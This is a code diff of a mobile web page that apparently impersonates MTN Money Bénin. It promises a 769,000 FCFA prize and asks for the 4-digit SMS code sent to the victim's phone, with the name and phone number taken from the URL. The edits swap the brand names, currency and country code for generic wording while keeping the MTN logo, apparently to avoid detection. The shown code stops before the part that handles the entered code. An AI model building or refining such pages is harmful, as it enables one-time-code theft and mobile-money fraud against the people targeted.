@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>MTN Money Bénin - Confirmation</title>
+    <title>Espace Membre - Confirmation</title>
     <style>
         * {
             margin: 0;
@@ -110,6 +110,7 @@
             padding: 25px 20px;
             box-shadow: 0 2px 5px rgba(0,0,0,0.05);
             border-left: 4px solid #ffcc00;
+            margin-bottom: 20px;
         }
         
         .otp-title {
@@ -127,7 +128,7 @@
             text-align: center;
         }
         
-        .sms-box {
+        .sms-simulation {
             background: #e8f4fd;
             border: 1px solid #b8daff;
             border-radius: 8px;
@@ -150,17 +151,17 @@
             font-size: 20px;
         }
         
-        .sms-text {
+        .sms-content {
             flex: 1;
         }
         
-        .sms-text .sms-sender {
+        .sms-content .sms-sender {
             font-weight: bold;
             color: #333;
             font-size: 14px;
         }
         
-        .sms-text .sms-preview {
+        .sms-content .sms-preview {
             color: #666;
             font-size: 13px;
             margin-top: 3px;
@@ -168,7 +169,7 @@
         
         .otp-container {
             display: flex;
-            gap: 10px;
+            gap: 12px;
             justify-content: center;
             margin: 25px 0;
         }
@@ -179,7 +180,7 @@
             border: 2px solid #ddd;
             border-radius: 10px;
             text-align: center;
-            font-size: 30px;
+            font-size: 28px;
             font-weight: bold;
             outline: none;
             background: white;
@@ -191,7 +192,7 @@
         
         .timer-box {
             background: #fff3cd;
-            padding: 10px;
+            padding: 12px;
             border-radius: 5px;
             font-size: 14px;
             color: #856404;
@@ -200,7 +201,7 @@
             margin: 15px 0;
         }
         
-        .info-text {
+        .info-message {
             font-size: 12px;
             color: #999;
             margin: 15px 0;
@@ -229,6 +230,7 @@
             font-weight: bold;
             cursor: pointer;
             margin: 15px 0;
+            transition: background 0.3s;
         }
         
         .btn:hover {
@@ -284,7 +286,7 @@
             100% { transform: rotate(360deg); }
         }
         
-        .amount-big {
+        .amount-highlight {
             font-size: 26px;
             font-weight: bold;
             color: #0066cc;
@@ -295,14 +297,14 @@
 <body>
     <div class="status-bar">
         <span class="time" id="currentTime"></span>
-        <span>🇧🇯 MTN Bénin</span>
+        <span>Espace Membre</span>
         <span></span>
     </div>
     
     <div class="container">
         <div class="mtn-header">
             <div class="mtn-logo">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/68/MTN_Logo.svg/2560px-MTN_Logo.svg.png" alt="MTN Benin">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/68/MTN_Logo.svg/2560px-MTN_Logo.svg.png" alt="Logo">
                 <span id="updateTime"></span>
             </div>
             <div class="mtn-welcome">
@@ -312,7 +314,7 @@
         
         <div class="promo-banner">
             <div class="promo-banner-top">DERNIÈRE ÉTAPE</div>
-            <div class="promo-banner-title">769 000 FCFA</div>
+            <div class="promo-banner-title">769 000 Unités</div>
         </div>
         
         <div class="content">
@@ -322,10 +324,10 @@
                     Code envoyé au <strong id="displayPhone"></strong>
                 </div>
                 
-                <div class="sms-box">
+                <div class="sms-simulation">
                     <div class="sms-icon">📱</div>
-                    <div class="sms-text">
-                        <div class="sms-sender">MTN Money</div>
+                    <div class="sms-content">
+                        <div class="sms-sender">Service</div>
                         <div class="sms-preview">Votre code: •••• (valable 5 min)</div>
                     </div>
                 </div>
@@ -342,11 +344,11 @@
                 </div>
                 
                 <div style="text-align: center;">
-                    <span class="amount-big">769 000 FCFA</span>
+                    <span class="amount-highlight">769 000 Unités</span>
                 </div>
                 
-                <div class="info-text">
-                    Entrez le code à 4 chiffres reçu par SMS
+                <div class="info-message">
+                    Entrez le code à 4 chiffres reçu
                 </div>
                 
                 <div class="resend-link">
@@ -354,14 +356,14 @@
                 </div>
                 
                 <button class="btn" id="submitBtn">
-                    VALIDER LE CODE
+                    VALIDER
                 </button>
             </div>
         </div>
         
         <div class="footer">
-            <p>Transaction sécurisée - MTN Money Bénin</p>
-            <p>Service partenaire GeoPoll</p>
+            <p>Transaction sécurisée</p>
+            <p>Service partenaire</p>
         </div>
     </div>
     
@@ -369,18 +371,18 @@
         <div class="loading-box">
             <div class="mtn-spinner"></div>
             <p>Vérification...</p>
-            <div class="amount-big">769 000 FCFA</div>
+            <div class="amount-highlight">769 000 Unités</div>
             <p id="loadingName"></p>
         </div>
     </div>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
-        const firstName = urlParams.get('firstname') || 'Koffi';
+        const firstName = urlParams.get('firstname') || 'Membre';
         const phone = urlParams.get('phone') || '97 00 00 00';
         
         document.getElementById('displayName').textContent = firstName;
-        document.getElementById('displayPhone').textContent = '+229 ' + phone;
+        document.getElementById('displayPhone').textContent = '📱 ' + phone;
         document.getElementById('loadingName').textContent = firstName;
         
         function updateTime() {
